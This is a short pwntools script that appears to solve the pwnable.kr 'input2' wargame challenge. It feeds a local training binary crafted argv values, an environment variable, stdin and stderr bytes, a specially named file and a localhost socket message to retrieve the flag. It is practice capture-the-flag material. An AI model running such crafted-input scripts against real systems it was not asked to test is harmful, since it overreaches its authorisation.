input2 = pwnable.kr, locally


from pwn import *
import os
import socket
import time

#context.log_level = 'debug'

# ===== STAGE 1: Prepare malicious argv =====
argv = []
environment = {b"\xde\xad\xbe\xef".decode('latin-1'): b"\xca\xfe\xba\xbe".decode('latin-1')}

# ===== STAGE 2: Prepare stderr input =====
with open("/tmp/file.txt", "wb") as f:
    f.write(b"\x00\x0a\x02\xff")  # Will be read via dup2

# ===== STAGE 4: Prepare file input =====
fd = os.open(b"/tmp/\x0a", os.O_WRONLY | os.O_CREAT)  # File named '\x0a'
os.write(fd, b"\x00\x00\x00\x00")
os.close(fd)

def setup():
    # Redirect stderr (fd 2) to read from /tmp/file.txt
    os.dup2(os.open("/tmp/file.txt", os.O_RDONLY), 2)

# Build argv array (64 dummy values + special args at 65,66,67)
for i in range(1, 100):
    if i == 65:
        argv.append(b"\x00")      # argv[65] = null byte
    elif i == 66:
        argv.append(b"\x20\x0a\x0d")  # argv[66] = special chars
    elif i == 67:
        argv.append(b"8000")      # argv[67] = port number
    else:
        argv.append(b"X")         # Dummy values

# ===== Execute the binary =====
p = process(['/home/input2/input2'] + argv, cwd='/tmp', preexec_fn=setup, env=environment)

# ===== STAGE 3: Send stdin input =====
p.send(b"\x00\x0a\x00\xff")

# ===== STAGE 5: Socket interaction =====
time.sleep(3)  # Critical: Wait for binary to start listening

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("127.0.0.1", 8000))  # Connect to binary's listener
    s.sendall(b"\xde\xad\xbe\xef")  # Send magic bytes

# Get flag!
p.interactive()
